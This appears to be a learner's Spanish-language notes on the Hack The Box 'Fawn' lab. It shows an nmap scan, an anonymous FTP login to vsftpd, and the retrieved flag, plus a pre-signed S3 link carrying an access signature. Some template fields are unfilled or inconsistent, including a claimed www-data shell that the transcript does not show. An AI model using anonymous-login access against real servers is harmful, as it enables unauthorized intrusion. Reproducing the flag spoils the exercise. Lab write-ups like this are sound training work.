---
tags:
  - htb
  - easy
  - Unix
  - Terminada
ip: 10.129.40.132
os: Unix
difficulty: Easy
status: Terminada
tiempo: 01h 30m
fecha_inicio: 2026-06-10
fecha_completada: 2026-06-10
puntos: 150
---
# 🖥️ [Fawn] — [Unix] — [Easy]

> [!info] Resumen
> **IP:** `10.129.40.132`  |  **OS:** Linux  |  **Dificultad:** Easy
> **Estado:** En progreso  |  **Tiempo total:** Xh Xm

---

## 1. Reconocimiento

### Nmap — Puertos rápidos

```bash
nmap -sCV 10.129.40.132
```

**Puertos encontrados:**

| Puerto | Servicio | Versión      | Notas                                                        |
| ------ | -------- | ------------ | ------------------------------------------------------------ |
| 21     | FTP      | vsftpd 3.0.3 | TYPE: ASCII<br>ftp-anon: Anonymous FTP login allowed<br><br> |


---
## 2. Foothold

> [!warning] Punto de Entrada
> Describir aquí el vector de entrada principal. ¿Qué servicio? ¿Qué vulnerabilidad?
> Se procedió a intentar loguear el servicio ftp a través del puerto 21, el cual al introducir en el name la palabra "anonymous", sin password, tuvimos un logien exitoso código de respuesta 230.

### Vulnerabilidad Identificada

**Nombre:** Anonymous FTP login allowed
**CVE:** CVE-1999-0497   
**Por qué funciona:** Login exitoso al conectarse al servicio FTP encontrado, mediante autenticación en Login "anonymous", contraseña en blanco, código de respuesta 230.

### Exploit Utilizado

```bash
ftp 10.129.40.132
Name (10.129.40.132:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

> [!tip] Lo que aprendí aquí
> Login vulnerableen servicio FTP mediante name "anonymous", dicha vulnerabilidad surge por una mala configuración del servicio.

### Shell Obtenida

- **Usuario:** `www-data`
- **Tipo de shell:** bash creo.
- **Estabilización de shell:** No realizada.

---
### Flag de Root

```
ftp> ls -la
229 Entering Extended Passive Mode (|||31582|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Jun 04  2021 .
drwxr-xr-x    2 0        121          4096 Jun 04  2021 ..
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
cat flag.txt          
035db21c881520061c53e0536e44f815
```

---

## 5. Lecciones Aprendidas

> [!danger] ¿Qué no sabía antes de esta máquina?
> - **Técnica Login Anonymous :** Al hacer un escaneo -sCV al puerto 21, se encuentra un servicio FTP versión vsftpd 3.0.3 que en respuesta entrega login anonymous vulnerable, se explota por esa vía y s eencuentra la flag en la raíz del S.O.

### ¿Dónde me bloqueé y por qué?

| Fase | Tiempo bloqueado | Causa real                                                                                                                                                                                                            |
| ---- | ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| HTB  | 20m              | No funcionaba la respuesta de la pregunta ¿Cuál es el comando que debemos ejecutar para mostrar el menú de ayuda del cliente 'ftp'? <br><br>ponía "ftp -h", "ftp-h", etc.<br><br>La que funcionó fue =="ftp -?"==<br> |



### Técnicas a Profundizar

- [x] Técnica Login Anonymous → Buscar en HackTricks
- [x] CVE Z → Entender el funcionamiento interno

### Herramientas Usadas

| Herramienta | Para qué la usé en esta máquina |
| ----------- | ------------------------------- |
| nmap        | Reconocimiento de puertos       |

### Conexión con Otras Máquinas / Técnicas

- Técnica similar a: `[[HTB/NombreMáquina/NombreMáquina]]`
- Ver también: `[[Técnicas/Nombre-Técnica]]`

---

## 6. Referencias

- [HackTricks - Nombre Técnica]([https://book.hacktricks.xyz/](https://hacktricks.wiki/es/network-services-pentesting/pentesting-ftp/index.html))
- [CVE o Exploit utilizado]([url](https://nvd.nist.gov/vuln/detail/CVE-1999-0497))
- [Writeup oficial HTB]([url](https://htb-content-prod-private-storage.s3.eu-central-1.amazonaws.com/machines/writeup/9e4d90d2-2466-45d9-84c2-40ce19af2c77.pdf?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA47CRVXI3GZ5T5FNV%2F20260611%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260611T002900Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Signature=ffa0a9445ab0723333a4b8d461b4f3bb8bb9b28d1a364fffe4ca9d6e67a3b246))
- [Youtube video]([https://ippsec.rocks/](https://www.youtube.com/watch?v=CU_tCe3rVr8))
